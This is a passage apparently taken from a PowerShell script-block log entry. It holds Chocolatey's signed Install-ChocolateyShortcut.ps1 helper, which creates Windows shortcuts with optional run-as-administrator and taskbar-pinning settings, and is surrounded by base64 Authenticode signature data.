BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgM4dhQyywPrPo8jpeR3DNbT7H2WdznBS1+Bus # KT2bfQ0wDQYJKoZIhvcNAQEBBQAEggEAbWUKxJRm84/EF8/zeqa1zKe4AWpJ/gEi # QwtcOXs0Qnyft51e8c1xU2GOQZgAGvgSh7/PxsyVsFf5RMUF4KTVDTiF1PBanepr # vyJHjlmCWoa+NIncrLkelzSZLVmR91IGBpxxuL3E03d1rLOBK3MsTsv/n1l0nTzj # Th0bWNHNjcnJ89/jqS6j0E/x06GXwECdXPke/u6rpZ+ne5huAOlJgmce9bBL1v39 # SLEstdUW37fHTfvf8W4O3vdUYwXayuZOv+5ACQA5wVnwEL/jv+qxNFlM1ciPSuDH # DnFvlJp1vUavbyg9F+n4RYni9EUQTAw9F7Izk3Mt3mS6HCFwSwVWtaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQUAIvU+JA/yY/VMDda # AF5AyoutdvkwDQYJKoZIhvcNAQEBBQAEggEAAw12+/6F/pa2s2bjPlFgk4ZjQcRt # p/abG6OoDWEMorncdvyhrOe39oQxthDUOLm/FW8JvvlFNHxBwjCy4KUxPRTsmmBf # JKzuGv9Au1dfjGJAS+lPZyxTC5nyeKbCnG3Zwy77dAxvN2ZVd/vRhyw/itKoE3Lv # MSvUKhrRTFB1Sm7if/dh9r5YiBFCgKoTJJ9PCxIrGOx6R3Gbci+StDJXHBDOqgDh # HNoYd6Z6V6AKPy3mzU3yitDuMA2ugksV6OHroWUCUGfVkUCPHJZMceJVXzYTbCUS # wgDjjauYaSo+kzjicD27CjwNSeHZP0MSLFSoHfoU76lF2iplygQ1pdmkMw== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Install-ChocolateyShortcut.ps1 ¦ ScriptBlockId: c582daed-1d6e-4b20-9b6b-bca23e84e021 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Install-ChocolateyShortcut { <# .SYNOPSIS Creates a shortcut .DESCRIPTION This adds a shortcut, at the specified location, with the option to specify a number of additional properties for the shortcut, such as Working Directory, Arguments, Icon Location, and Description. .NOTES If this errors, as it may if being run under the local SYSTEM account with particular folder that SYSTEM doesn't have, it will display a warning instead of failing a package installation. .INPUTS None .OUTPUTS None .PARAMETER ShortcutFilePath The full absolute path to where the shortcut should be created. .PARAMETER TargetPath The full absolute path to the target for new shortcut. .PARAMETER WorkingDirectory OPTIONAL - The full absolute path of the Working Directory that will be used by the new shortcut. As of v0.10.12, the directory will be created unless it contains environment variable expansion like `%AppData%\FooBar`. .PARAMETER Arguments OPTIONAL - Additonal arguments that should be passed along to the new shortcut. .PARAMETER IconLocation OPTIONAL- The full absolute path to an icon file to be used for the new shortcut. .PARAMETER Description OPTIONAL - A text description to be associated with the new description. .PARAMETER WindowStyle OPTIONAL - Type of windows target application should open with. Available in 0.9.10+. 0 = Hidden, 1 = Normal Size, 3 = Maximized, 7 - Minimized. Full list table 3.9 here: https://technet.microsoft.com/en-us/library/ee156605.aspx .PARAMETER RunAsAdmin OPTIONAL - Set ""Run As Administrator"" checkbox for the created the shortcut. Available in 0.9.10+. .PARAMETER PinToTaskbar OPTIONAL - Pin the new shortcut to the taskbar. Available in 0.9.10+. .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .EXAMPLE > # This will create a new shortcut at the location of ""C:\test.lnk"" and # link to the file located at ""C:\text.exe"" Install-ChocolateyShortcut -ShortcutFilePath ""C:\test.lnk"" -TargetPath ""C:\test.exe"" .EXAMPLE > # This will create a new shortcut at the location of ""C:\notepad.lnk"" # and link to the Notepad application. In addition, other properties # are being set to specify the working directory, an icon to be used for # the shortcut, along with a description and arguments. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WorkingDirectory ""C:\"" ` -Arguments ""C:\test.txt"" ` -IconLocation ""C:\test.ico"" ` -Description ""This is the description"" .EXAMPLE > # Creates a new notepad shortcut on the root of c: that starts # notepad.exe as Administrator. Shortcut is also pinned to taskbar. # These parameters are available in 0.9.10+. Install-ChocolateyShortcut ` -ShortcutFilePath ""C:\notepad.lnk"" ` -TargetPath ""C:\Windows\System32\notepad.exe"" ` -WindowStyle 3 ` -RunAsAdmin ` -PinToTaskbar .LINK Install-ChocolateyDesktopLink .LINK Install-ChocolateyExplorerMenuItem .LINK Install-ChocolateyPinnedTaskBarItem #> param( [parameter(Mandatory=$true, Position=0)][string] $shortcutFilePath, [parameter(Mandatory=$true, Position=1)][string] $targetPath, [parameter(Mandatory=$false, Position=2)][string] $workingDirectory, [parameter(Mandatory=$false, Position=3)][string] $arguments, [parameter(Mandatory=$false, Position=4)][string] $iconLocation, [parameter(Mandatory=$false, Position=5)][string] $description, [parameter(Mandatory=$false, Position=6)][int] $windowStyle, [parameter(Mandatory=$false)][switch] $runAsAdmin, [parameter(Mandatory=$false)][switch] $pinToTaskbar, [parameter(ValueFromRemainingArguments = $true)][Object[]]$ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters # http://powershell.com/cs/blogs/tips/archive/2009/02/05/validating-a-url.aspx function isURIWeb($address) { $uri = $address -as [System.URI] $uri.AbsoluteURI -ne $null -and $uri.Scheme -match '[http|https]' } if (!$shortcutFilePath) { # shortcut file path could be null if someone is trying to get special # paths for LocalSystem (SYSTEM). Write-Warning ""Unable to create shortcut. `$shortcutFilePath can not be null."" return } $shortcutDirectory = $([System.IO.Path]::GetDirectoryName($shortcutFilePath)) if (!(Test-Path($shortcutDirectory))) { [System.IO.Directory]::CreateDirectory($shortcutDirectory) | Out-Null } if (!$targetPath) { throw ""Install-ChocolateyShortcut - `$targetPath can not be null."" } if(!(Test-Path($targetPath)) -and !(IsURIWeb($targetPath))) { Write-Warning ""'$targetPath' does not exist. If it is not created the shortcut will not be valid."" } if($iconLocation) { if(!(Test-Path($iconLocation))) { Write-Warning ""'$iconLocation' does not exist. A default icon will be used."" } } if ($workingDirectory) { if ($workingDirectory -notmatch '%\w+%' -and !(Test-Path($workingDirectory))) { [System.IO.Directory]::CreateDirectory($workingDirectory) | Out-Null } } Write-Debug ""Creating Shortcut..."" try { $global:WshShell = New-Object -com ""WScript.Shell"" $lnk = $global:WshShell.CreateShortcut($shortcutFilePath) $lnk.TargetPath = $targetPath $lnk.WorkingDirectory = $workingDirectory $lnk.Arguments = $arguments if($iconLocation) { $lnk.IconLocation = $iconLocation } if ($description) { $lnk.Description = $description } if ($windowStyle) { $lnk.WindowStyle = $windowStyle } $lnk.Save() Write-Debug ""Shortcut created."" [System.IO.FileInfo]$Path = $shortcutFilePath If ($runAsAdmin) { #In order to enable the ""Run as Admin"" checkbox, this code reads the .LNK as a stream # and flips a specific bit while writing a new copy. It then replaces the original # .LNK with the copy, similar to this example: http://poshcode.org/2513 $TempFileName = [IO.Path]::GetRandomFileName() $TempFile = [IO.FileInfo][IO.Path]::Combine($Path.Directory, $TempFileName) $Writer = New-Object System.IO.FileStream $TempFile, ([System.IO.FileMode]::Create) $Reader = $Path.OpenRead() While ($Reader.Position -lt $Reader.Length) { $Byte = $Reader.ReadByte() If ($Reader.Position -eq 22) {$Byte = 34} $Writer.WriteByte($Byte) } $Reader.Close() $Writer.Close() $Path.Delete() Rename-Item -Path $TempFile -NewName $Path.Name | Out-Null } If ($pinToTaskbar) { $scfilename = $Path.FullName $pinverb = (new-object -com ""shell.application"").namespace($(split-path -parent $Path.FullName)).Parsename($(split-path -leaf $Path.FullName)).verbs() | ?{$_.Name -eq 'Pin to Tas&kbar'} If ($pinverb) {$pinverb.doit()} } } catch { Write-Warning ""Unable to create shortcut. Error captured was $($_.Exception.Message)."" } } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCV4kKnyvkP8Q6w # z2NjPs2m5xO4ValwoIiDMeri2Kx1gKCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # 